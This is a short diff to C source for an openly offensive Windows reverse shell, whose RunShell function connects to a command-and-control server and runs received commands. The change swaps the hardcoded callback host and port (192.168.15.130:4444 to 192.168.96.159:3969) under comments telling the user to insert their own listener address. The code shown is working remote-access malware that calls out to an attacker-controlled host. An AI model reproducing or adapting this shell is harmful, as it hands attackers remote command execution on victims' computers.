@@ -44,7 +44,6 @@ void RunShell(char* C2Server, int C2Port) {
                 WaitForSingleObject(pinfo.hProcess, INFINITE);
                 CloseHandle(pinfo.hProcess);
                 CloseHandle(pinfo.hThread);
-
                 memset(RecvData, 0, sizeof(RecvData));
                 int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                 if (RecvCode <= 0) {
@@ -67,8 +66,8 @@ int main(int argc, char **argv) {
         RunShell(argv[1], port);
     }
     else {
-        char host[] = "192.168.15.130";  // change this to your ip address
-        int port = 4444;                //chnage this to your open port
+        char host[] = "192.168.96.159";  // change this to your ip address
+        int port = 3969;                //chnage this to your open port
         RunShell(host, port);
     }
     return 0;
